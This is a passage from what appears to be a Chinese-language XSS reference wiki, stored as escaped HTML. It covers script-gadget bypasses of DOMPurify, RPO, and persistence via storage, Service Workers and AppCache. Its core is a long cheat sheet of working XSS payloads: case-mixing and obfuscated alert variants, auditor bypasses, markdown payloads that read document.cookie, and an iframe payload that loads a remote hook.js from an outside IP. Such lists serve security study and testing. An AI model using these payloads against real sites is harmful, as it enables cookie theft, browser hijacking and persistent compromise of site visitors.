punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;sensitive-information&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;AB&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当字符较多时，则可以结合  &lt;code&gt;::first-line&lt;/code&gt;  等 CSS 属性缩小范围，以获取更精确的内容&lt;/p&gt;
&lt;h2 id=&#34;bypass-via-script-gadgets&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass-via-script-gadgets&#34;&gt;#&lt;/a&gt; Bypass Via Script Gadgets&lt;/h2&gt;
&lt;h3 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为  &lt;code&gt;Code Reuse&lt;/code&gt;  的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文  &lt;code&gt;Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets&lt;/code&gt;  中有该方法的具体描述。&lt;/p&gt;
&lt;p&gt;portswigger 的一篇博文也表达了类似的想法  &lt;code&gt;https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;下面有一个简单的例子，这个例子使用了  &lt;code&gt;DOMPurify&lt;/code&gt;  来加固，但是因为引入了  &lt;code&gt;jquery.mobile.js&lt;/code&gt;  导致可以被攻击。&lt;/p&gt;
&lt;h3 id=&#34;例子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#例子&#34;&gt;#&lt;/a&gt; 例子&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;// index.php
&amp;lt;?php

$msg = $_GET[&#39;message&#39;];
$msg = str_replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;, $msg);
$msg = base64_encode($msg);

?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Preview&amp;lt;/title&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;purify.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;jquery.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;jquery.mobile.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
    var d= atob(&#39;&amp;lt;?php echo $msg; ?&amp;gt;&#39;);
    var cleanvar = DOMPurify.sanitize(d);
    document.write(cleanvar);
    &amp;lt;/script&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
// payload
&amp;lt;div data-role=popup id=&#39;--&amp;gt;
&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;&#39;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;rporelative-path-overwrite&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rporelative-path-overwrite&#34;&gt;#&lt;/a&gt; RPO(Relative Path Overwrite)&lt;/h2&gt;
&lt;p&gt;RPO (Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。&lt;/p&gt;
&lt;h1 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; Payload&lt;/h1&gt;
&lt;h2 id=&#34;常用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用&#34;&gt;#&lt;/a&gt; 常用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svg onload=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=document.domain onerror=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;M onmouseover=alert(document.domain)&amp;gt;M&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;marquee onscroll=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:alert(document.domain)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;body onload=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;details open ontoggle=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;embed src=javascript:alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(1)&amp;lt;/ScRiPt&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/ScRiPt&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iMg src=1 oNeRrOr=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ImG src=1 OnErRoR=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(&amp;quot;M&amp;quot;)&amp;quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;marquee onscroll=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;mArQuEe OnScRoLl=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;MaRqUeE oNsCrOlL=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;各种alert&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#各种alert&#34;&gt;#&lt;/a&gt; 各种 alert&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;confirm(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;1&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;1&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert&lt;/code&gt; 1 &lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;(alert)(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;a=alert,a(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;[1].find(alert)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[&amp;quot;al&amp;quot;+&amp;quot;ert&amp;quot;](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[&amp;quot;a&amp;quot;+&amp;quot;l&amp;quot;+&amp;quot;e&amp;quot;+&amp;quot;r&amp;quot;+&amp;quot;t&amp;quot;](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[/al/.source+/ert/.source](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪协议&#34;&gt;#&lt;/a&gt; 伪协议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/0/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/00/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/000/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/M/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chrome-xss-auditor-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chrome-xss-auditor-bypass&#34;&gt;#&lt;/a&gt; Chrome XSS auditor bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;?param=https://&amp;amp;param=@z.exeye.io/import%20rel=import%3E&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;base href=javascript:/M/&amp;gt;&amp;lt;a href=,alert(1)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;base href=javascript:/M/&amp;gt;&amp;lt;iframe src=,alert(1)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;长度限制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度限制&#34;&gt;#&lt;/a&gt; 长度限制&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;s+=&amp;quot;l&amp;quot;&amp;lt;/script&amp;gt;
\...
&amp;lt;script&amp;gt;eval(s)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;jquery-sourcemappingurl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jquery-sourcemappingurl&#34;&gt;#&lt;/a&gt; jquery sourceMappingURL&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;var a=1//@ sourceMappingURL=//xss.site&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;图片名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图片名&#34;&gt;#&lt;/a&gt; 图片名&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.cookie)&amp;gt;.gif
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;过期的payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过期的payload&#34;&gt;#&lt;/a&gt; 过期的 payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;src=javascript:alert 基本不可以用&lt;/li&gt;
&lt;li&gt;css expression 特性只在旧版本 ie 可用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css&#34;&gt;#&lt;/a&gt; css&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&amp;quot;background-image:url(javascript:alert(/xss/))&amp;quot;&amp;gt;
&amp;lt;STYLE&amp;gt;@import&#39;http://ha.ckers.org/xss.css&#39;;&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;markdown&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#markdown&#34;&gt;#&lt;/a&gt; markdown&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
&amp;lt;&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;
![a&#39;&amp;quot;`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;iframe-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iframe-2&#34;&gt;#&lt;/a&gt; iframe&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;iframe onload=&#39;
    var sc   = document.createElement(&amp;quot;scr&amp;quot; + &amp;quot;ipt&amp;quot;);
    sc.type  = &amp;quot;text/javascr&amp;quot; + &amp;quot;ipt&amp;quot;;
    sc.src   = &amp;quot;http://1.2.3.4/js/hook.js&amp;quot;;
    document.body.appendChild(sc);
    &#39;
/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=javascript:alert(1)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;data:text/html,&amp;lt;iframe src=javascript:alert(&#39;M&#39;)&amp;gt;&amp;lt;/iframe&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe srcdoc=&amp;lt;svg/onload=alert(1)&amp;gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=https://baidu.com width=1366 height=768&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=javascript:alert(1) width=1366 height=768&amp;gt;&amp;lt;/iframe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;form&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#form&#34;&gt;#&lt;/a&gt; form&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form action=javascript:alert(1)&amp;gt;&amp;lt;input type=submit&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;button formaction=javascript:alert(1)&amp;gt;M&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=submit value=M&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=image value=M&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=image src=1&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;meta&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#meta&#34;&gt;#&lt;/a&gt; meta&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;META HTTP-EQUIV=&amp;quot;Link&amp;quot; Content=&amp;quot;&amp;lt;http://ha.ckers.org/xss.css&amp;gt;; REL=stylesheet&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;持久化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化&#34;&gt;#&lt;/a&gt; 持久化&lt;/h1&gt;
&lt;h2 id=&#34;基于存储&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于存储&#34;&gt;#&lt;/a&gt; 基于存储&lt;/h2&gt;
&lt;p&gt;有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在  &lt;code&gt;eval(data)&lt;/code&gt;  之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。&lt;/p&gt;
&lt;p&gt;在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用  &lt;code&gt;String.fromCharCode&lt;/code&gt;  来绕过。&lt;/p&gt;
&lt;h2 id=&#34;service-worker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#service-worker&#34;&gt;#&lt;/a&gt; Service Worker&lt;/h2&gt;
&lt;p&gt;Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。&lt;/p&gt;
&lt;p&gt;在 Chrome 中，可通过  &lt;code&gt;chrome://inspect/#service-workers&lt;/code&gt;  来查看 Service Worker 的状态，并进行停止。&lt;/p&gt;
&lt;h2 id=&#34;appcache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appcache&#34;&gt;#&lt;/a&gt; AppCache&lt;/h2&gt;
&lt;p&gt;在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;wiki&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wiki&#34;&gt;#&lt;/a&gt; wiki&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bd2Vzb21lWFNT&#34;&gt;AwesomeXSS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93M2MuZ2l0aHViLmlvL3dlYmFwcHNlYy1jc3Av&#34;&gt;w3c&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dpc2VjL2RvbXhzc3dpa2kvd2lraQ==&#34;&gt;dom xss wiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb250ZW50LXNlY3VyaXR5LXBvbGljeS5jb20v&#34;&gt;content-security-policy.com&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaHVicy5pby9leHBsb2l0aW5nLW1hcmtkb3duLXN5bnRheC1hbmQtdGVsZXNjb3BlLXBlcnNpc3RlbnQteHNzLXRocm91Z2gtbWFya2Rvd24tY3ZlLTIwMTQtNTE0NC8=&#34;&gt;markdwon xss&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9icnV0ZWxvZ2ljLmNvbS5ici9ibG9nL2NoZWF0LXNoZWV0Lw==&#34;&gt;xss cheat sheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odG1sNXNlYy5vcmcv&#34;&gt;html5 security cheatsheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vd2hpdGVwYXBlci1odHRwLXNlY3VyaXR5LWhlYWRlcnMv&#34;&gt;http security headers&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9YU1NDaGFsbGVuZ2VXaWtpL3dpa2k=&#34;&gt;XSSChallengeWiki&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;challenges&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#challenges&#34;&gt;#&lt;/a&gt; Challenges&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=&#34;&gt;XSS Challenge By Google&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Byb21wdC5tbC8w&#34;&gt;prompt to win&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css-2&#34;&gt;#&lt;/a&gt; CSS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy50aGVzcGFubmVyLmNvLnVrLzIwMTQvMDMvMjEvcnBvLw==&#34;&gt;rpo&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56amljbWlzYS5vcmcvaW5kZXgucGhwL2FyY2hpdmVzLzEyNy8=&#34;&gt;rpo 攻击初探&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdXJlc2VjLmNvbS9ibG9nL2FydGljbGUvYmxvZy9SZWFkaW5nLURhdGEtdmlhLUNTUy1JbmplY3Rpb24tMTgwLmh0bWw=&#34;&gt;Reading Data via CSS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21rc2Jlbi5sMC5jbS8yMDE1LzEwL2Nzcy1iYXNlZC1hdHRhY2stYWJ1c2luZy11bmljb2RlLXJhbmdlLmh0bWw=&#34;&gt;css based attack abusing unicode range&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vbG10X3N3YWxsb3cvY3NzLWluamVjdGlvbi1wbHVzLXBsdXMtamktY3VuLXNob3UtZmEtZmFsc2VnYWktZ3Vhbi10b2R1aS1jZQ==&#34;&gt;css injection&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnNoZWRkb3cueHl6L2Nzcy10aW1pbmctYXR0YWNrLw==&#34;&gt;css timing attack&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;同源策略-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同源策略-2&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvU2VjdXJpdHkvU2FtZS1vcmlnaW5fcG9saWN5&#34;&gt;Same origin policy&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVkZWZlbmRlZC5jb20vcGFwZXJzL2NvcnMtc2VjdXJpdHktZ3VpZGU=&#34;&gt;cors security guide&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL2xvZ2ljYWxseS1ieXBhc3NpbmctYnJvd3Nlci1zZWN1cml0eS1ib3VuZGFyaWVz&#34;&gt;logically bypassing browser security boundaries&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;bypass-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass-2&#34;&gt;#&lt;/a&gt; bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSm9oYW5uZXNIb3BwZS81NjEyMjc0&#34;&gt;666 lines of xss payload&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hc2F0b2tpbnVnYXdhL2ZpbHRlcmJ5cGFzcw==&#34;&gt;xss auditor bypass&lt;/span&gt;&lt;/li&gt;
